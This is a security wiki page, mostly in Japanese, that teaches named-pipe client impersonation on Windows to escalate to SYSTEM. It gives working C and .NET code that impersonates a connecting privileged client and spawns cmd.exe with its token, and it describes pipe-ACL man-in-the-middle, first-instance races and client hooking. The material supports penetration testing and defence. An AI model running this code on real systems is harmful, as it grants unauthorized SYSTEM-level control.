# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation は、named-pipe server thread が接続してきた client の security context を引き継げるようにする local privilege escalation primitive です。実際には、SeImpersonatePrivilege で code を実行できる attacker が、privileged な client（例: SYSTEM service）を attacker-controlled pipe に接続させ、ImpersonateNamedPipeClient を呼び出し、その結果得られた token を primary token に duplicate して、client として process を起動できます（多くの場合 NT AUTHORITY\SYSTEM）。

このページでは core technique に焦点を当てます。SYSTEM をあなたの pipe に接続させる end-to-end の exploit chain については、下に記載されている Potato family のページを参照してください。

## TL;DR
- named pipe を作成する: \\.\pipe\<random> そして connection を待つ。
- privileged な component にそれへ接続させる（spooler/DCOM/EFSRPC/etc.）。
- pipe から少なくとも 1 つの message を読み、その後 ImpersonateNamedPipeClient を呼ぶ。
- 現在の thread から impersonation token を開き、DuplicateTokenEx(TokenPrimary) し、CreateProcessWithTokenW/CreateProcessAsUser で SYSTEM process を得る。

## Requirements and key APIs
- 呼び出し元 process/thread に通常必要な privileges:
- SeImpersonatePrivilege を使って接続してきた client の impersonation に成功し、CreateProcessWithTokenW を使う。
- あるいは、SYSTEM を impersonate した後に CreateProcessAsUser を使う。この場合 SeAssignPrimaryTokenPrivilege と SeIncreaseQuotaPrivilege が必要になることがある（これらは SYSTEM を impersonate している間は満たされる）。
- 使用される core APIs:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile（impersonation の前に少なくとも 1 回 message を読む必要がある）
- ImpersonateNamedPipeClient と RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW または CreateProcessAsUser
- Impersonation level: local で有用な操作を行うには、client が SecurityImpersonation を許可している必要がある（多くの local RPC/named-pipe clients の default）。client は pipe を開く際に SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION を使ってこれを下げられる。

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
メモ:
- ImpersonateNamedPipeClient が ERROR_CANNOT_IMPERSONATE (1368) を返す場合は、まず pipe から読み取りを行っていることと、client が impersonation を Identification level に制限していないことを確認してください。
- process creation に適した primary token を作成するには、SecurityImpersonation と TokenPrimary を指定した DuplicateTokenEx を優先してください。

## .NET quick example
.NET では、NamedPipeServerStream は RunAsClient を介して impersonate できます。impersonating したら、thread token を duplicate して process を作成します。
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM をあなたの pipe に呼び込むための一般的な trigger/coercions
これらの techniques は、特権サービスに named pipe へ接続させて impersonate できるようにするものです:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

詳細な使い方と互換性はここを参照してください:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

pipe を作成して、service trigger から impersonate して SYSTEM を起動する完全な例だけが必要なら、ここを参照してください:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

特権 service と低権限 process が `\\.\pipe\...` を通じて通信する場合、その pipe は他の untrusted な IPC boundary と同様に扱ってください。従来の server-side impersonation だけでなく、弱い pipe ACL、unsafe な creation flags、client-side の trust decision も、すべて local privilege escalation の primitive になりえます。

### まず候補の pipe を列挙する
- PowerShell で素早く pipe を一覧表示する: `Get-ChildItem \\.\pipe\`
- Sysinternals の `pipelist64.exe` は、instance 数や single-instance pipe を見つけるのに便利です。
- `SYSTEM` で動作する service が使う名前を優先してください。特に helper、updater、launcher、UI broker です。

### permissive な DACL と追加の pipe instance を使った MITM
- 特権 server と通信できる process は、すでにその protocol を fuzz したり privileged verb を探したりできます。
- より興味深いのは、DACL が pipe object に `FILE_GENERIC_WRITE`/`GENERIC_WRITE` を許可している場合です。named pipe ではこれは暗黙に `FILE_CREATE_PIPE_INSTANCE` を含みます (`FILE_APPEND_DATA` は同じ bit を共有しています)。そのため、attacker は同じ名前の別の server instance を作成できます。
- instance は FIFO 順で対応付けられるため、attacker が作成した instance と正規の instance は混在しえます: `CreateNamedPipe` で rogue instance を作成し、同じ pipe 名を `CreateFile` で開いて、実際の client が rogue server instance に到着するのを待ちます。
- 結果: 元の server process を所有していなくても、特権 IPC を観測、改変、relay、または desynchronize できます。

### pipe security descriptor の first-instance race
- `lpSecurityAttributes` は、pipe 名の最初の instance が作成されたときにのみ DACL を定義します。
- 特権 service が遅れて起動し、`FILE_FLAG_FIRST_PIPE_INSTANCE` を使用しない場合、attacker は permissive な DACL で先に pipe 名を作成し、その後 service に attacker が選んだ security context で後続の instance を作成させることができます。
- これは service startup を race condition に変えます: 最初の instance を先に取ってから、弱められた ACL を使って後続の client に接続または MITM します。
- defenders にとっての mitigation であり、attacker にとっての重要な review point: `CreateNamedPipe(..., dwOpenMode, ...)` に `FILE_FLAG_FIRST_PIPE_INSTANCE` が含まれているか確認してください。含まれていない場合は、service 起動前の pre-creation を試してください。

### PID/signature check は boundary ではなく hardening
- 一部の product は、接続してきた client の `GetNamedPipeClientProcessId`、process image path、または Authenticode signer をチェックしてアクセスを制限しようとします。
- これは、正規の client に inject するまでしか有効ではありません。trusted process の内部に入れば、server が期待する正確な PID/image/signature context を継承します。
- split desktop app では、`SYSTEM` service を直接攻撃するより、低権限の UI/helper process を instrument するほうが簡単なことがよくあります。

### I/O model に応じて client を hook する
- Synchronous I/O: syscall が buffer を消費する前に `NtWriteFile` を intercept し、戻った後に `NtReadFile` を inspect/patch します。
- Overlapped I/O: `NtReadFile` で見えた `OVERLAPPED`/`IoStatusBlock` を保存し、`GetOverlappedResult` または関連する wait が完了した後に buffer を inspect します。
- Completion ports: `GetQueuedCompletionStatus` は `NtRemoveIoCompletion` に到達します。返される `ApcContext` は、元の read で使われた `OVERLAPPED` に結び付いており、現在 populated された buffer を見つける正しい pivot です。
- Completion routines (`ReadFileEx`): completion callback は APC として配信されます。返された data を改変したり synthetic reply を注入したりしたい場合は、実際の completion routine を hook し、custom injection には、routine の期待する 3 つの引数を再構築する 1 引数の `QueueUserAPC` dispatcher を使ってください。

### Tooling のメモ
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) は、named-pipe traffic を inject された helper DLL 経由で proxy し、編集/replay のための Burp のような workflow を提供します。
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) は Frida ベースの approach を取り、上記の `NtReadFile`/`NtWriteFile` と async/completion pivot の hook に注力し、その後 traffic を WebSocket ベースの editing workflow に転送します。
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operational considerations
- Named pipes are low-latency; long pauses while editing buffers can deadlock brittle services.
- Overlapped/completion-port/APC-driven clients need different hooks than simple `ReadFile`/`WriteFile` detours.
- Injection into the trusted client is noisy and generally best kept for exploit development, protocol reversing, or local lab fuzzing.

## Troubleshooting and gotchas
- You must read at least one message from the pipe before calling ImpersonateNamedPipeClient; otherwise you’ll get ERROR_CANNOT_IMPERSONATE (1368).
- If the client connects with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, the server cannot fully impersonate; check the token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requires SeImpersonatePrivilege on the caller. If that fails with ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser after you already impersonated SYSTEM.
- Ensure your pipe’s security descriptor allows the target service to connect if you harden it; by default, pipes under \\.\pipe are accessible according to the server’s DACL.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
